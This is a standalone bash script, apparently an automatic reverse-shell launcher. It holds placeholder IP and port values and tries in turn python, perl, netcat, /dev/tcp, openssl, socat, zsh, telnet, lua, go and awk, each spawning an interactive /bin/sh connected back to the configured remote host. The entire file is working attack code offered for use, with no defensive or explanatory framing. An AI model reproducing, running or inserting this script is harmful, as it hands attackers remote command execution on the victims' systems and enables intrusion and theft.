#!/bin/bash
IP="YXYXYX"
PORT="XYXYXY"
command_exists() {
    command -v "$1" >/dev/null 2>&1
}
if command_exists python; then
    python -c "import socket, subprocess, os; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(('$IP', $PORT)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); subprocess.call(['/bin/sh', '-i']);"
    exit
fi
if command_exists perl; then
    perl -e "use Socket;\$i='$IP';\$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};"
    exit
fi
if command_exists nc; then
    rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc $IP $PORT > /tmp/f
    exit
fi
if command_exists sh; then
    /bin/sh -i >& /dev/tcp/$IP/$PORT 0>&1
    exit
fi
if command_exists nc; then
    nc -e /bin/sh $IP $PORT
    exit
fi
if command_exists openssl; then
    mkfifo /tmp/s
    /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $IP:$PORT > /tmp/s
    rm /tmp/s
    exit
fi
if command_exists socat; then
    socat TCP:$IP:$PORT EXEC:'/bin/sh -i',pty,stderr,setsid,sigint,sane
    exit
fi
if command_exists zsh; then
    zsh -c "zmodload zsh/net/tcp && ztcp $IP $PORT && zsh >&\$REPLY 2>&\$REPLY 0>&\$REPLY"
    exit
fi
if command_exists telnet; then
    TF=$(mktemp -u)
    mkfifo $TF
    telnet $IP $PORT 0<$TF | /bin/sh 1>$TF
    exit
fi
if command_exists lua; then
    lua -e "local host, port = '$IP', $PORT; local socket = require('socket'); local tcp = socket.tcp(); local io = require('io'); tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive(); local f = io.popen(cmd, 'r'); local s = f:read('*a'); f:close(); tcp:send(s); if status == 'closed' then break end end; tcp:close();"
    exit
fi
if command_exists go; then
    echo 'package main; import "os/exec"; import "net"; func main() { c, _ := net.Dial("tcp", "'$IP':'$PORT'"); cmd := exec.Command("/bin/sh"); cmd.Stdin = c; cmd.Stdout = c; cmd.Stderr = c; cmd.Run() }' > /tmp/t.go
    go run /tmp/t.go
    rm /tmp/t.go
    exit
fi
if command_exists awk; then
    awk 'BEGIN {s = "/inet/tcp/0/'$IP'/'$PORT'"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
    exit
fi
